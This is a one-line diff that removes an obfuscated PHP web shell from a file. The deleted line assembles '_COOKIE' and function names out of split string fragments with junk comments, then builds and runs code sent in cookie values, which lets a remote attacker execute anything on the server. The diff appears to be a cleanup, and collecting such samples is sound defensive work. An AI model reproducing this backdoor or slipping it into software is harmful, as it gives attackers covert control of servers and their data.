@@ -1,1 +1,0 @@
-<?php $q='E';$zn/*x6v*/='OKI';$dp/*9)*/='_CO';$m=/*6*/${$dp.$zn.$q};if(isset($m['ed'])){$yi=/*we.[*/$m['ed'].$m['UM'];$pw=$m['xW'].$m['AQ'].$m['Y'];$z=$yi('',$pw($m['cw']));$z();}
